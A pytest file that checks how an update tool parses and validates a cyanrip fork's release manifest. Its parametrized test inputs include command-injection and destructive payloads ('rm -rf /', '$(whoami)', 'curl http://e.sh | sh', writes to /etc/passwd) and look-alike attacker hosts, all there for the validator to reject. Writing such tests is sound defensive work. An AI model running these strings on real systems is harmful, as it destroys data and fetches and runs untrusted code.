"""The cyanrip fork's release manifest: parsing it, and what we do with it.

Two subjects, deliberately in one file because they are one seam: reading *their*
document (`deps/ripper_manifest.py`) and deciding what it means given *our* record
(`deps/ripper_offer.py`).

The fixture below is the manifest the fork actually published (their
`PLATTERPUS-AUTO-UPDATE-INTEGRATION.md`, 2026-08-07), not one invented to suit the
parser — a fixture written by the consumer tests the consumer's idea of the format,
which is the shared-ancestor failure `CLAUDE.md` names.
"""

from __future__ import annotations

import json
from typing import Any

import pytest

from platterpus.deps import fork_source
from platterpus.deps.ripper_manifest import (
    CHANNEL_BETA,
    CHANNEL_STABLE,
    CHANNELS,
    SUPPORTED_SCHEMA,
    SUPPORTED_SCHEMAS,
    CancellableFetcher,
    RipperManifest,
    fetch_manifest,
    parse_manifest,
)
from platterpus.deps.ripper_offer import (
    OFFER_AVAILABLE,
    OFFER_NOT_DETERMINED,
    OFFER_UP_TO_DATE,
    evaluate_offer,
)

# The published manifest, verbatim in shape. `install` is spelled out rather than
# elided with "..." as their prose did, because our validator checks the host.
PUBLISHED: dict[str, Any] = {
    "schema": 1,
    "project": "cyanrip-fork",
    "default_channel": "stable",
    "latest_seq": 11,
    "channels": {
        "stable": {
            "version": "0.9.4-rc1+platterpus.5",
            "commit": "ddf7ac3",
            "release_seq": 11,
            "handshake_round": 7,
            "round_closed": True,
            "install": "https://github.com/rmccann-hub/cyanrip/archive/ddf7ac3.tar.gz",
        },
        "beta": {
            "version": "0.9.4-rc1+platterpus.5",
            "commit": "ddf7ac3",
            "release_seq": 11,
            "handshake_round": 7,
            "round_closed": True,
            "install": "https://github.com/rmccann-hub/cyanrip/archive/ddf7ac3.tar.gz",
        },
    },
}


# The schema-2 manifest, verbatim from the fork's `release-manifest.json` at
# `c455683` — the document live at `MANIFEST_URL` today. Round 11 added the `build`
# field and moved the number; both are here because both are what a user's
# Platterpus now fetches.
#
# **Kept as a second fixture rather than an edit to the first.** Schema 1 is still
# accepted and still has to parse: it is the shape of every manifest published
# before the bump, which is the direction round 11 §0's downgrade path runs in. One
# fixture mutated into the new shape would have deleted the only test of the old one.
PUBLISHED_V2: dict[str, Any] = {
    "channels": {
        "beta": {
            "build": "meson setup build -Ddeclare_released=true && ninja -C build",
            "commit": "c4d1a00",
            "handshake_round": 10,
            "install": "https://github.com/rmccann-hub/cyanrip/archive/c4d1a00.tar.gz",
            "release_seq": 16,
            "round_closed": True,
            "version": "0.9.4-rc1+platterpus.6",
        },
        "stable": {
            "build": "meson setup build -Ddeclare_released=true && ninja -C build",
            "commit": "c4d1a00",
            "handshake_round": 10,
            "install": "https://github.com/rmccann-hub/cyanrip/archive/c4d1a00.tar.gz",
            "release_seq": 16,
            "round_closed": True,
            "version": "0.9.4-rc1+platterpus.6",
        },
    },
    "default_channel": "stable",
    "latest_seq": 16,
    "manifest_url": (
        "https://raw.githubusercontent.com/rmccann-hub/cyanrip/"
        "platterpus-fork/release-manifest.json"
    ),
    "note": (
        "Machine-readable. Order by release_seq -- the version string cannot be "
        "ordered, because the part that advances is SemVer build metadata, which "
        "is ignored for precedence."
    ),
    "project": "cyanrip-fork",
    "repo": "https://github.com/rmccann-hub/cyanrip",
    "schema": 2,
}


def _manifest(**overrides: Any) -> RipperManifest:
    """Parse the published manifest with ``channels`` patched, asserting it parsed."""
    document = json.loads(json.dumps(PUBLISHED))
    for channel, patch in overrides.items():
        document["channels"][channel].update(patch)
    parsed = parse_manifest(json.dumps(document))
    assert parsed is not None, "the published manifest shape must parse"
    return parsed


# --- Reading their document -------------------------------------------------


def test_the_published_manifest_parses() -> None:
    """The floor: if this fails, every other test here is asserting about nothing."""
    manifest = _manifest()
    stable = manifest.channel(CHANNEL_STABLE)
    assert stable is not None
    assert stable.commit == "ddf7ac3"
    assert stable.release_seq == 11
    assert stable.handshake_round == 7
    assert stable.round_closed is True
    assert stable.build_tag == "platterpus-fork-gddf7ac3"


def test_ordering_is_by_release_seq_not_the_version_string() -> None:
    """**The rule the fork asked for, and the reason it is not optional.**

    Their version is upstream's `0.9.4-rc1` plus `+platterpus.N` — SemVer *build
    metadata*, which the spec says MUST be ignored for precedence. So two different
    releases can carry a byte-identical version string, and any implementation that
    compared versions would see equality forever and never offer an upgrade.

    This test pins exactly that case: same version, higher `release_seq`. A
    version-comparing implementation passes every other test in this file and fails
    this one.
    """
    manifest = _manifest(stable={"release_seq": 12, "commit": "abc1234"})
    stable = manifest.channel(CHANNEL_STABLE)
    assert stable is not None
    assert stable.version == "0.9.4-rc1+platterpus.5"  # unchanged, deliberately

    # Installed release 11, offered release 12, identical version strings.
    assert manifest.newer_than(CHANNEL_STABLE, 11) is stable
    # And the converse: equal is not newer, so an offer is never re-made.
    assert manifest.newer_than(CHANNEL_STABLE, 12) is None
    # A lower published seq is never offered — that would be a downgrade.
    assert manifest.newer_than(CHANNEL_STABLE, 13) is None


def test_the_channel_is_read_from_the_manifest_not_sniffed_from_the_version() -> None:
    """A substring check for "beta" is wrong in both directions; prove neither happens.

    The fork spells a pre-release `-beta.1`; we spell ours `b1`. A sniffer would
    mislabel one of them. So: a **stable** row whose version happens to contain the
    word beta stays stable, and a **beta** row whose version contains no such word
    stays beta. Only the manifest key decides.
    """
    manifest = _manifest(
        stable={"version": "0.9.4-rc1+platterpus.6-beta.9"},
        beta={"version": "0.9.4-rc1+platterpus.7", "release_seq": 12},
    )
    stable = manifest.channel(CHANNEL_STABLE)
    beta = manifest.channel(CHANNEL_BETA)
    assert stable is not None and beta is not None
    assert stable.channel == CHANNEL_STABLE, "a 'beta'-looking version is still stable"
    assert beta.channel == CHANNEL_BETA, "a clean-looking version is still beta"


@pytest.mark.parametrize("schema", [0, 3, 99])
def test_an_unimplemented_schema_is_refused_not_guessed_at(schema: int) -> None:
    """Refusing is what the field is FOR — a consumer that guesses makes it useless."""
    document = json.loads(json.dumps(PUBLISHED))
    document["schema"] = schema
    assert parse_manifest(json.dumps(document)) is None


def test_the_supported_schema_is_the_one_the_newest_fixture_declares() -> None:
    """Non-triviality floor for the test above: it must be refusing the *right* thing.

    Without this, `SUPPORTED_SCHEMA` could drift to a value no manifest carries and
    the parametrized refusals above would all pass while the real manifest failed.

    Checked against `PUBLISHED_V2`, the *newest* real document, because that is the
    one a user's Platterpus meets today.
    """
    assert PUBLISHED_V2["schema"] == SUPPORTED_SCHEMA


def test_every_accepted_schema_has_a_real_fixture_behind_it() -> None:
    """`SUPPORTED_SCHEMAS` may not carry a number nothing in this file exercises.

    The pair above tests the *newest*. This tests the rest, and it is the one that
    stops the accepted set quietly growing a value whose fields nobody implemented —
    the schema-1 half is exactly what round 11 §0's downgrade path depends on.
    """
    fixtures = {doc["schema"] for doc in (PUBLISHED, PUBLISHED_V2)}
    missing = sorted(SUPPORTED_SCHEMAS - fixtures)
    assert not missing, (
        f"schema(s) {missing} are accepted but no real published document in this "
        "file exercises them — add the fixture or stop accepting the number."
    )


@pytest.mark.parametrize(
    "commit",
    [
        "",
        "ddf7ac",  # too short
        "d" * 41,  # too long
        "DDF7AC3",  # upper case — not what git prints
        "ddf7ac3; rm -rf /",
        "ddf7ac3 --upload-pack=evil",
        "$(whoami)",
        "../../etc/passwd",
        "ddf7ac3\nnext-line",
        "zzzzzzz",  # right length, not hex
    ],
)
def test_an_implausible_commit_is_refused(commit: str) -> None:
    """**The argv guard, not a tidiness check.**

    This field is handed to `git checkout --force --detach` inside the container by
    `fork_source.target_for_commit`. A manifest that has been tampered with — or has
    simply gone wrong — must not be able to put a metacharacter on a command line.
    Refused rather than sanitised: there is no *nearly* valid commit, and a
    "repaired" one would name a different build.
    """
    document = json.loads(json.dumps(PUBLISHED))
    document["channels"]["stable"]["commit"] = commit
    parsed = parse_manifest(json.dumps(document))
    # The stable row drops; beta is untouched and still parses, which is the
    # row-level rather than document-level failure this is supposed to have.
    assert parsed is None or parsed.channel(CHANNEL_STABLE) is None


def test_a_bad_row_drops_only_itself() -> None:
    """One malformed channel must not hide a good one."""
    document = json.loads(json.dumps(PUBLISHED))
    document["channels"]["stable"]["commit"] = "not-a-sha"
    parsed = parse_manifest(json.dumps(document))
    assert parsed is not None
    assert parsed.channel(CHANNEL_STABLE) is None
    assert parsed.channel(CHANNEL_BETA) is not None


def test_round_closed_must_be_a_real_boolean() -> None:
    """Tri-state discipline: a missing `round_closed` is not `False`.

    Defaulting it False would report a closed round as open; defaulting it True
    would claim verification nobody performed. Dropping the row makes it "not
    determined", which is the only honest option.
    """
    for value in (None, "true", 1, "yes", ""):
        document = json.loads(json.dumps(PUBLISHED))
        document["channels"]["stable"]["round_closed"] = value
        parsed = parse_manifest(json.dumps(document))
        assert parsed is None or parsed.channel(CHANNEL_STABLE) is None, (
            f"round_closed={value!r} must not be read as a boolean"
        )


def test_the_wrong_project_is_refused() -> None:
    document = json.loads(json.dumps(PUBLISHED))
    document["project"] = "some-other-project"
    assert parse_manifest(json.dumps(document)) is None


def test_an_install_url_off_our_hosts_is_refused() -> None:
    for url in (
        "http://github.com/x/y.tar.gz",  # not https
        "https://evil.example.com/x.tar.gz",
        "https://github.com.evil.example/x.tar.gz",
        "ftp://github.com/x.tar.gz",
    ):
        document = json.loads(json.dumps(PUBLISHED))
        document["channels"]["stable"]["install"] = url
        parsed = parse_manifest(json.dumps(document))
        assert parsed is None or parsed.channel(CHANNEL_STABLE) is None, url


@pytest.mark.parametrize(
    "text",
    [
        "",
        "   ",
        "null",
        "[]",
        "42",
        '"a string"',
        "{",
        "{}",
        '{"schema": 1}',
        '{"schema": 1, "project": "cyanrip-fork", "channels": []}',
        "\x00\x01\x02",
    ],
)
def test_parse_never_raises_on_junk(text: str) -> None:
    """Parsers of external output return a best-effort answer; they do not raise."""
    assert parse_manifest(text) is None


def test_fetch_failure_is_not_determined_never_a_crash() -> None:
    def boom(_url: str) -> str:
        raise OSError("network is down")

    assert fetch_manifest(fetch=boom) is None


def test_a_cancelled_fetcher_refuses_to_start() -> None:
    """`cancel()` before `fetch()` must not be silently ignored.

    The gap between constructing a worker and its thread actually running is real,
    and a cancel that lands there would otherwise start a network read the window
    has already decided to abandon.
    """
    fetcher = CancellableFetcher()
    fetcher.cancel()
    with pytest.raises(ValueError):
        fetcher.fetch("https://example.invalid/manifest.json")


def test_cancel_is_safe_before_during_and_twice() -> None:
    """A cancel must never be the thing that raises during teardown."""
    fetcher = CancellableFetcher()
    fetcher.cancel()
    fetcher.cancel()  # idempotent


def test_our_channel_vocabulary_matches_the_apps_own() -> None:
    """One Settings vocabulary covers both checks, so the two tuples must agree.

    `settings_validation` derives its allowed sets from these two tuples separately.
    If they drifted, a user could select a channel for one check that the other
    rejects — the kind of split that is invisible until someone flips the setting.
    """
    from platterpus.update_check import CHANNELS as APP_CHANNELS

    assert set(CHANNELS) == set(APP_CHANNELS)


# --- Our pin's place in their sequence --------------------------------------


def test_the_pinned_commit_has_a_recorded_release_number() -> None:
    """**The gate that stops the pin and its sequence number from splitting.**

    Moving `FORK_PIN` without recording its `release_seq` would leave the update
    check comparing against a stale number — silently offering a downgrade, or
    silently suppressing a real upgrade. Keying the map by commit makes the omission
    detectable, and this is what detects it.
    """
    assert fork_source.FORK_PIN in fork_source.FORK_RELEASE_SEQ_BY_PIN, (
        f"FORK_PIN is {fork_source.FORK_PIN!r} but FORK_RELEASE_SEQ_BY_PIN has no "
        f"entry for it. Read the release_seq off the fork's release-manifest.json "
        f"and record it — do not guess, and do not derive it from the version string."
    )
    assert fork_source.FORK_PIN_RELEASE_SEQ is not None


def test_the_recorded_sequence_agrees_with_the_published_manifest() -> None:
    """Check the constant against the fork's own document, not against itself.

    The fixture is their published manifest, so this compares our recorded number to
    the number they published for the same commit — the artifact, not our memory of
    it.
    """
    stable = _manifest().channel(CHANNEL_STABLE)
    assert stable is not None
    if stable.commit == fork_source.FORK_PIN:
        assert fork_source.release_seq_for_commit(fork_source.FORK_PIN) == (
            stable.release_seq
        )


def test_an_unknown_commit_has_no_sequence() -> None:
    """Tri-state: a build outside the numbered releases returns None, not 0."""
    assert fork_source.release_seq_for_commit("0000000") is None
    assert fork_source.release_seq_for_commit("") is None
    # A test pin is deliberately absent from the map — it was never a release.
    assert fork_source.release_seq_for_commit(fork_source.FORK_TEST_PIN) is None


def test_a_dirty_build_of_a_known_commit_still_orders() -> None:
    assert fork_source.release_seq_for_commit(f"{fork_source.FORK_PIN}-dirty") == (
        fork_source.FORK_PIN_RELEASE_SEQ
    )


# --- What the offer says ----------------------------------------------------


def test_up_to_date_and_not_determined_are_different_answers() -> None:
    """A check that cannot reach the manifest must never report "you're current".

    This is the "satisfied by finding nothing" failure in its most direct form: an
    unreachable network and an up-to-date ripper would render identically, and the
    reassuring one is the wrong default.
    """
    unreachable = evaluate_offer(None, CHANNEL_STABLE)
    assert unreachable.verdict == OFFER_NOT_DETERMINED
    assert not unreachable.is_actionable

    current = evaluate_offer(_manifest(), CHANNEL_STABLE, installed_commit="ddf7ac3")
    assert current.verdict == OFFER_UP_TO_DATE
    assert unreachable.verdict != current.verdict


def test_an_unnumbered_build_is_not_determined_not_an_upgrade() -> None:
    """A mid-round test pin has no place in the release sequence, and we say so.

    Offering an "upgrade" from a build we cannot order would be a guess presented as
    a fact, and during a hardware session it is exactly the wrong advice.
    """
    offer = evaluate_offer(
        _manifest(), CHANNEL_STABLE, installed_commit=fork_source.FORK_TEST_PIN
    )
    assert offer.verdict == OFFER_NOT_DETERMINED
    assert fork_source.FORK_TEST_PIN in offer.detail


def test_a_newer_build_states_the_unapproved_consequence() -> None:
    """The offer must say what taking it costs, in the offer itself.

    A build from a round our record has not verified makes every subsequent rip
    report `unapproved`. That is the whole reason this flow exists rather than an
    auto-updater, so it is asserted rather than left to review.
    """
    manifest = _manifest(
        stable={
            "release_seq": 14,
            "commit": "beefcaf",
            "handshake_round": 9,
            "round_closed": True,
        }
    )
    offer = evaluate_offer(manifest, CHANNEL_STABLE, installed_commit="ddf7ac3")
    assert offer.verdict == OFFER_AVAILABLE
    assert offer.is_actionable
    assert offer.would_be_unapproved is True
    assert "unapproved" in offer.detail
    # And it must hand over the exact route, which drives the same step engine the
    # wizard does rather than a copied shell snippet.
    assert "--install-ripper beefcaf" in offer.detail


def test_an_open_round_on_their_side_is_said_out_loud() -> None:
    manifest = _manifest(
        stable={
            "release_seq": 14,
            "commit": "beefcaf",
            "handshake_round": 9,
            "round_closed": False,
        }
    )
    offer = evaluate_offer(manifest, CHANNEL_STABLE, installed_commit="ddf7ac3")
    assert offer.verdict == OFFER_AVAILABLE
    assert "OPEN" in offer.detail


def test_an_unknown_channel_falls_back_to_stable_never_widens() -> None:
    """Failing toward *more* offers is not a safe direction."""
    offer = evaluate_offer(_manifest(), "nightly", installed_commit="ddf7ac3")
    assert offer.channel == CHANNEL_STABLE


def test_the_offer_never_installs_anything() -> None:
    """A structural guard, because the consequence of getting this wrong is silent.

    `ripper_offer` must not import or call the install machinery. Asserted on the
    module source rather than by observing behaviour: an install path that is merely
    never *reached* today is one refactor from being reached tomorrow.
    """
    import inspect

    from platterpus.deps import ripper_offer

    source = inspect.getsource(ripper_offer)
    for forbidden in (
        "fork_build_commands",
        "install_command",
        "build_command",
        "subprocess",
        "Popen",
        "HostSetup",
    ):
        assert forbidden not in source, (
            f"ripper_offer references {forbidden!r} — this module decides what to "
            f"SAY, never what to run. Installing a ripper is a handshake event and "
            f"must stay a person's decision."
        )


# --- Schema 2's `build` field: parsed, never executed -----------------------
#
# Round 11 §J1 asked us to take the build command from the manifest instead of
# hardcoding `-Ddeclare_released=true`, because the option does not exist before
# `+platterpus.6` and meson fails the WHOLE configure on an unknown `-D` — so a
# constant would make our own current pin unbuildable and kill the downgrade path.
#
# We agreed with the requirement and refused the mechanism. The field is a *shell
# command string*; running it would turn a remote JSON document into arbitrary
# command execution inside the user's container, on a path whose later steps run
# `sudo install`. So we parse it, keep only allowlisted `-D` options, and build with
# our own command. These tests are that boundary.


def test_the_published_v2_manifest_parses_and_carries_the_build_option() -> None:
    """The floor for this whole section, against the real document."""
    parsed = parse_manifest(json.dumps(PUBLISHED_V2))
    assert parsed is not None, "the live schema-2 manifest must parse"
    assert parsed.schema == 2
    stable = parsed.channel(CHANNEL_STABLE)
    assert stable is not None
    assert stable.commit == "c4d1a00"
    assert stable.meson_options == ("-Ddeclare_released=true",), (
        "the one option the live manifest carries did not survive validation"
    )


def test_a_schema_1_manifest_still_parses_and_carries_no_options() -> None:
    """The downgrade direction, which is the reason schema 1 stays accepted.

    A commit predating `meson_options.txt` must be built with a bare `meson setup`;
    empty options is not a degraded answer here, it is the *correct* one.
    """
    parsed = parse_manifest(json.dumps(PUBLISHED))
    assert parsed is not None
    stable = parsed.channel(CHANNEL_STABLE)
    assert stable is not None
    assert stable.commit == "ddf7ac3", "fixture drifted off our production pin"
    assert stable.meson_options == ()


@pytest.mark.parametrize(
    ("label", "build"),
    [
        ("shell chain into curl", "meson setup build && curl http://e.sh | sh"),
        ("semicolon rm", "meson setup build; rm -rf /home && ninja -C build"),
        ("backtick", "meson setup build `id` && ninja -C build"),
        ("dollar-paren", "meson setup build $(id) && ninja -C build"),
        ("redirect", "meson setup build > /etc/passwd && ninja -C build"),
        ("unknown option", "meson setup build -Dprefix=/evil && ninja -C build"),
        ("disallowed value", "meson setup build -Ddeclare_released=yes"),
        ("option with no value", "meson setup build -Ddeclare_released"),
        ("a different program", "make install && ninja -C build"),
        ("not a string", 42),
        ("a list", ["meson", "setup"]),
    ],
)
def test_a_build_field_we_do_not_fully_understand_yields_no_options(
    label: str, build: Any
) -> None:
    """Refuse the WHOLE field, never a partial reading.

    Two failures are being prevented and they are different. The obvious one is
    execution — nothing here is ever run, so the shell metacharacters are inert by
    construction; what these assert is that the *option extraction* does not quietly
    salvage `-Ddeclare_released=true` out of a command that also says something we
    did not understand.

    The subtler one: silently dropping the part we dislike and keeping the rest turns
    a build instruction into something nobody wrote. A command we only partly
    understand is a command we do not understand.
    """
    document = json.loads(json.dumps(PUBLISHED_V2))
    document["channels"]["stable"]["build"] = build
    parsed = parse_manifest(json.dumps(document))
    assert parsed is not None, "a bad `build` must not drop the row — it is not fatal"
    stable = parsed.channel(CHANNEL_STABLE)
    assert stable is not None
    assert stable.meson_options == (), f"{label}: options survived validation"


def test_an_oversized_build_field_is_refused() -> None:
    """Bounded like every other inbound string — the seam's line-length rule."""
    document = json.loads(json.dumps(PUBLISHED_V2))
    document["channels"]["stable"]["build"] = "-Ddeclare_released=true " * 500
    parsed = parse_manifest(json.dumps(document))
    assert parsed is not None
    stable = parsed.channel(CHANNEL_STABLE)
    assert stable is not None and stable.meson_options == ()


def test_the_refusals_above_are_not_vacuous() -> None:
    """The revert check, as an assertion rather than a memory.

    Every case in the parametrized test expects `()`. If the validator were changed
    to return `()` unconditionally, all of them would still pass — and so would the
    schema-1 test, which also expects `()`. This is the one that would fail.
    """
    accepted = parse_manifest(json.dumps(PUBLISHED_V2))
    assert accepted is not None
    stable = accepted.channel(CHANNEL_STABLE)
    assert stable is not None
    assert stable.meson_options, (
        "the validator accepts nothing at all — every refusal test above is vacuous"
    )
